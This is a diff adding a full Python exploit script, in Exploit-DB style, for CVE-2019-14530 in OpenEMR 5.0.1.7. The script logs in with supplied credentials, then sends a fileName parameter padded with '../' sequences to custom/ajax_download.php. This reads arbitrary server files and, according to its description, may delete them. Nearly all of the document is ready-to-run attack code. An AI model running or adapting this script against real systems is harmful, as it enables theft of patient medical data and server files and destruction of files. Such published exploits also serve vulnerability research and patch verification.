@@ -1,0 +1,129 @@
+# Exploit Title: OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)
+# Date 16.06.2021
+# Exploit Author: Ron Jost (Hacker5preme)
+# Vendor Homepage: https://www.open-emr.org/
+# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_7.zip
+# Version: All versions prior to 5.0.2
+# Tested on: Ubuntu 18.04
+# CVE: CVE-2019-14530
+# CWE: CWE-22
+# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/CVE-2019-14530-Exploit/README.md
+# Reference: https://raw.githubusercontent.com/Wezery/CVE-2019-14530/master/Path%20traversal%20and%20DoS.pdf
+
+'''
+Description:
+An issue was discovered in custom/ajax_download.php in OpenEMR before 5.0.2 via the fileName parameter.
+An authenticated attacker can download any file (that is readable by the user www-data)
+from server storage. If the requested file is writable for the www-data user and the directory
+/var/www/openemr/sites/default/documents/cqm_qrda/ exists, it will be deleted from server.
+'''
+
+
+'''
+Banner:
+'''
+banner = """ 
+ 
+ 
+ ______     _______     ____   ___  _  ___        _ _  _  ____ _____  ___  
+ / ___\ \   / / ____|   |___ \ / _ \/ |/ _ \      / | || || ___|___ / / _ \ 
+| |    \ \ / /|  _| _____ __) | | | | | (_) |_____| | || ||___ \ |_ \| | | |
+| |___  \ V / | |__|_____/ __/| |_| | |\__, |_____| |__   _|__) |__) | |_| |
+ \____|  \_/  |_____|   |_____|\___/|_|  /_/      |_|  |_||____/____/ \___/ 
+                        
+                                            by Hacker5preme
+                                                                            
+"""
+print(banner)
+
+
+'''
+Import required modules:
+'''
+import requests
+import argparse
+
+
+'''
+User-Input:
+'''
+my_parser = argparse.ArgumentParser(description='OpenEMR Path Traversal')
+my_parser.add_argument('-T', '--IP', type=str)
+my_parser.add_argument('-P', '--PORT', type=str)
+my_parser.add_argument('-U', '--PATH', type=str)
+my_parser.add_argument('-u', '--USERNAME', type=str)
+my_parser.add_argument('-p', '--PASSWORD', type=str)
+args = my_parser.parse_args()
+target_ip = args.IP
+target_port = args.PORT
+openemr_path = args.PATH
+username = args.USERNAME
+password = args.PASSWORD
+print('')
+Filepath = input('[+] Filepath: ')
+
+
+'''
+Authentication:
+'''
+session = requests.Session()
+auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&site=default'
+
+# Header:
+header = {
+    'Host': target_ip,
+    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
+    'Accept-Encoding': 'gzip, deflate',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Origin': 'http://' + target_ip,
+    'Connection': 'close',
+    'Upgrade-Insecure-Requests': '1'
+}
+
+# Body:
+body = {
+    'new_login_session_management': '1',
+    'authProvider': 'Default',
+    'authUser': username,
+    'clearPass': password,
+    'languageChoice': '1'
+}
+
+# Authenticate:
+print('')
+auth = session.post(auth_url, headers=header, data=body)
+if 'error=1&site=' in auth.text:
+    print('[-] Authentication failed')
+    exit()
+else:
+    print('[+] Authentication successfull: ' + str(auth))
+
+
+'''
+Path Traversal:
+'''
+url_static = 'http://' + target_ip + ':' + target_port + openemr_path
+url_dynamic = '/custom/ajax_download.php?fileName=../../../../../../../../..'
+url_exploit = url_static + url_dynamic + Filepath
+print('')
+print('[+] Constructed malicious URL: ')
+
+# Headers:
+header = {
+    'Host': target_ip,
+    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
+    'Accept-Encoding': 'gzip, deflate',
+    'Connection': 'close',
+    'Upgrade-Insecure-Requests': '1'
+}
+
+# Exploit:
+print('')
+print('[+] Contents of ' + Filepath + ':')
+print('')
+getfile = session.get(url_exploit, headers = header)
+print(getfile.text)
